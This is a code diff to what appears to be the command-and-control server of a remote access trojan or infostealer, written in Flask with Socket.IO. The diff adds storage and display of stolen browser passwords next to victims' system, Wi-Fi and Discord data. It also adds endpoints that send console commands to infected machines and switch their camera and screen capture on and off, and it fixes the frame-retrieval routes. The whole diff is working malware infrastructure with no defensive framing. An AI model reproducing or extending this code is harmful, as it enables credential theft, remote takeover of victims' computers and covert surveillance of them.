@@ -31,7 +31,27 @@ def client1(clientId):
 	systemInfo = clients[clientid]["systemInfo"]
 	wifis = clients[clientid]["wifis"]
 	discordinfo = clients[clientid]["discordInfo"]
-	return render_template(f'client.html', clientId = clientId, systeminfo=systemInfo, Wifis=wifis, Discordinfo=discordinfo)
+	browserPasswords = clients[clientid]["browserPasswords"]
+	return render_template(f'client.html', clientId = clientId, systeminfo=systemInfo, Wifis=wifis, Discordinfo=discordinfo, browserPasswords=browserPasswords)
+
+@app.route('/send_console', methods=['POST'])
+def send_console():
+	user_input = request.json
+	print(f"User input: {user_input}")
+	socketio.emit('send_console', user_input)
+	return "aga"
+
+@app.route('/toggle_camera', methods=['POST'])
+def toggle_camera():
+	state = request.json
+	socketio.emit('toggle_camera', state)
+	return "aga"
+
+@app.route('/toggle_screen', methods=['POST'])
+def toggle_screen():
+	state = request.json
+	socketio.emit('toggle_screen', state)
+	return "aga"
 
 @app.route('/client', methods=['GET', 'POST'])
 def regclient():
@@ -41,8 +61,15 @@ def regclient():
 		json = request.json
 		if not json['uuid'] in clients:
 			clientId = randint(1000,9999)
-			clients[json['uuid']] = {"clientId": clientId,"systemInfo": json['osInfo'],"clientClipboard": "", "wifis": json['wifis'], "discordInfo": json['discordInfo']}
-			print(clients[json['uuid']])
+			clients[json['uuid']] = {
+				"clientId": clientId,
+				"systemInfo": json['osInfo'],
+				"clientClipboard": "",
+				"wifis": json['wifis'],
+				"discordInfo": json['discordInfo'],
+				"browserPasswords": json['browserPasswords']
+			}
+
 		else:
 			clientId = clients[json['uuid']]['clientId']
 			print(f"{clients[json['uuid']]} arleady in clients!")
@@ -67,7 +94,7 @@ def send_camera(json):
 
 @app.route('/get_camera_frame', methods=['GET'])
 def get_camera_frame():
-	if last_frame[request.args.get('id')]:
+	if request.args.get('id') in last_frame:
 		response = Response(io.BytesIO(last_frame[request.args.get('id')]), mimetype='image/jpeg')
 		response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
 		return response
@@ -85,7 +112,7 @@ def send_screen(json):
 
 @app.route('/get_screen_frame', methods=['GET'])
 def get_screen():
-	if screen_last_frame[request.args.get('id')]:
+	if request.args.get('id') in screen_last_frame:
 		response = Response(io.BytesIO(screen_last_frame[request.args.get('id')]), mimetype='image/jpeg')
 		response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
 		return response
@@ -136,4 +163,4 @@ def upload_file():
 
 if __name__ == '__main__':
 	#app.run(host='0.0.0.0', port=5000, debug=True)
-	socketio.run(app, host='0.0.0.0', port=20075)
+	socketio.run(app, host='0.0.0.0', log_output=True)
